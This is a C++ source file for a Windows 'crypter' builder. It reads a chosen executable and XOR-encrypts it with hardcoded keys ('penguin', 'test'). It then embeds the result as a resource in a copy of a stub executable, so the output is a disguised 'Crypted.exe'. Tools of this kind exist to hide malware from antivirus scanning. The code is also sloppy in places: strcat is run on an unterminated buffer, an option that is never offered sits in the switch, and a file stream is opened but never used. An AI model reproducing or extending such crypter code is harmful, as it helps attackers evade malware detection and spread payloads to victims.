/**
Copyright (c) <2013, <Penguin>
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met: 

1. Redistributions of source code must retain the above copyright notice, this
   list of conditions and the following disclaimer. 
2. Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution. 

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

The views and conclusions contained in the software and documentation are those
of the authors and should not be interpreted as representing official policies, 
either expressed or implied, of the FreeBSD Project.
**/



/**
 * Research:
 * http://stackoverflow.com/questions/20365005/c-xor-encryption
 * 
 * 
 * Credits:
 * -igitalNemesis
 * -Grigori Perelman
 * -MicroPenguin
 * -Original Unknown
 * 
 * */


#pragma warning (disable:4996)
#include <iostream>
#include <Windows.h>
#include <fstream>
using namespace std;

char * FB; //The Buffer that will store the File's data
DWORD fs; // We will store the File size here
char output[MAX_PATH];
char choice[1];
DWORD dwBytesWritten = 0;
char name[MAX_PATH];   // We will store the Name of the Crypted file here

void RDF() //The Function that Reads the File and Copies the stub
{
	DWORD bt;
									

	cout << "Please enter the Path of the file \nIf the file is in the same folder as the builder\nJust type the file name with an extention\nEG: Stuff.exe\n";
	cout << "File Name: ";
	cin >> name; // Ask for input from the user and store that inputed value in the name variable
	cout << "Enter output name: ";
	cin >> output;
	CopyFile("stub.exe", output/*L"Crypted.exe"*/, 0);// Copy stub , so we done need to download a new one each time we crypt
	// ofcourse we can just update the resources with new data but whatever
	cout << "\nGetting the HANDLE of the file to be crypted\n";
	HANDLE efile = CreateFile(name, GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);	
	//^ Get the handle of the file to be crypted
	cout << "Getting the File size\n";
	fs = GetFileSize(efile, NULL);
	//Get its size , will need to use it for the encryption and buffer that will store that Data allocation
	cout << "The File Size is: ";
	cout << fs;
	cout << " Bytes\n";
	cout << "Allocating Memory for the ReadFile function\n";
	FB = new char[fs];// Allocate the exact ammount of space 
	cout << "Reading the file\n";
	ReadFile(efile, FB, fs, &bt, NULL);//Read the file (put the files data in to a FB buffer)
	CloseHandle(efile);//close the handle
}
void enc() // The function that Encrypts the info on the FB buffer
{
	cout << "Encrypting the Data\n";

	switch (choice[0])
	{
	case '1':
		return;
		break;
	case '2':
		{

				char cipher[] = "penguin";
				ofstream out("Builder.txt");
				for (int i = 0; i < fs; i++)
				{
					 FB[i] ^= cipher[i % strlen(cipher)]; // Simple Xor chiper
				}
		}
		break;
	case '3':
		{
			char cipher[] = "test";
			unsigned short pl = strlen(cipher);
			char passTable[1024];
			for (int i = 0; i != 1024; ++i)
				passTable[i] = cipher[i%pl];

			for (unsigned long long i = 0; i != fs; i += 2)
			{
				FB[i] ^= passTable[i % 1024];
			}

			}
		return;
	}
}

void choose_enc()
{
	//Asks users for encryption method
	cout << "\n\nChoose encryption method: " << endl;
	cout << "1. N/A" << endl;
	cout << "2. Simple XOR" << endl;
	cin >> choice;
	//HANDLE encryption = CreateFile(L"temp.dat", GENERIC_ALL, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	//WriteFile(
	//	encryption,           // open file handle
	//	choice,      // start of data to write
	//	strlen(choice),  // number of bytes to write
	//	&dwBytesWritten, // number of bytes that were written
	//	NULL);            // no overlapped structure
	//CloseHandle(encryption);
}

void WriteToResources(LPTSTR szTargetPE, int id, LPBYTE lpBytes, DWORD dwSize) // Function that Writes Data to resources 
{
	cout << "Writing Encrypted data to stub's resources\n";
	HANDLE hResource = NULL;
	hResource = BeginUpdateResource(szTargetPE, FALSE);
	UpdateResource(hResource, RT_RCDATA, MAKEINTRESOURCE(id), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPVOID)lpBytes, dwSize);
	EndUpdateResource(hResource, FALSE);
}
int main() // The main function (Entry point)
{
	RDF(); //Read the file
	choose_enc();
	enc(); //Encrypt it 
	strcat(FB, choice);
	cout << fs << endl;
	WriteToResources(output/*L"Crypted.exe"*/, 1, (BYTE *)FB, fs);//Write the encrypted data to resources
	cout << "Your File Got Crypted\n";
	system("PAUSE");
}

